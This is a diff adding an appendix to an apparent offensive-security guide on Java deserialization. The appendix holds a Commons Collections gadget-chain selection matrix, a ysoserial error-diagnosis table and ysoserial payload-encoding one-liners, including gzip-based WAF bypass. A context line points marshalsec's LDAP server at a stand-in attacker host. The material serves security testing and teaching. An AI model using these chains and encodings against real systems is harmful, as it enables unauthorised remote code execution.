@@ -394,3 +394,60 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389
 - **NCC Group Java Deserialization Whitepaper**: https://www.nccgroup.com/us/research-blog/java-deserialization-vulnerabilities/ -- In-depth technical analysis
 - **CVE-2015-4852 (WebLogic)**: Original Java deserialization CVE that started the trend
 - **CVE-2017-10271 (WebLogic SOAP)**: WebLogic WLS-WSAT component XMLDecoder deserialization
+
+## Appendix: Gadget Chain Quick Reference
+
+### Commons Collections Chain Selection Matrix
+
+Choosing the correct CommonsCollections chain depends on library version, JVM configuration, and whether a SecurityManager is present. Use this matrix to rapidly select the right chain during engagements.
+
+| Chain | CC Version | SecurityManager | Key Gadget | Reliability |
+|-------|-----------|----------------|------------|-------------|
+| CC1 | 3.1-3.2.1 | No | InvokerTransformer via AnnotationInvocationHandler | Medium |
+| CC2 | 4.0 | No | TransformingComparator + PriorityQueue | High |
+| CC3 | 3.1-3.2.1 | No | InstantiateTransformer + TrAXFilter | High |
+| CC4 | 4.0 | No | ChainedTransformer + TransformingComparator | High |
+| CC5 | 3.1-3.2.1 | Yes | InvokerTransformer via LazyMap + BadAttributeValueExpException | High |
+| CC6 | 3.1-3.2.1 | Yes | HashSet + HashMap + TiedMapEntry | Very High |
+| CC7 | 3.1-3.2.1 | Yes | Hashtable + AbstractMap + ChainedTransformer | High |
+
+### Common Error Messages and Diagnoses
+
+When ysoserial payloads fail, the resulting error messages can help diagnose the root cause and guide chain selection.
+
+| Error Message | Cause | Resolution |
+|---------------|-------|------------|
+| `ClassNotFoundException: org.apache.commons.collections.functors.InvokerTransformer` | CC3 not on classpath, might be CC4 | Try CommonsCollections2 or CommonsCollections4 |
+| `IllegalAccessException` | SecurityManager blocking reflection | Use CC5, CC6, or CC7 which work with SecurityManager |
+| `java.io.InvalidClassException: local class incompatible` | serialVersionUID mismatch | Target has different library version; try alternative chain |
+| `StreamCorruptedException` | Payload encoding issue | Verify Base64 decoding; try gzip-wrapped payload |
+| `ClassCastException` | Chain partially executed but wrong type | Try different chain targeting same sink |
+| No error, no callback | Deserialization not happening | Verify input vector actually triggers readObject() |
+
+### Payload Encoding Decision Tree
+
+Different delivery vectors require different encoding. Use this decision tree to select the correct encoding.
+
+```bash
+# Decision tree for payload encoding:
+# 1. Is the payload in a cookie or HTTP header? -> Base64
+# 2. Is the payload in a URL GET parameter? -> URL-safe Base64 (tr '+/' '-_')
+# 3. Is the payload in a POST body? -> Raw binary or Base64
+# 4. Is there a WAF? -> Gzip compress first, then Base64
+# 5. Is it for WebLogic T3? -> Raw binary with T3 protocol header
+# 6. Is it for JBoss JMX? -> Raw binary with Content-Type: application/x-java-serialized-object
+# 7. Is it for file upload? -> Raw binary file
+
+# Quick encoding examples for each scenario:
+# Cookie:
+java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
+
+# GET parameter:
+java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 | tr '+/' '-_'
+
+# WAF bypass with compression:
+java -jar ysoserial.jar CommonsCollections6 'id' | gzip | base64 -w0
+
+# Double URL-encoding for Tomcat:
+java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(urllib.parse.quote(sys.stdin.read().strip()),safe=''))"
+```
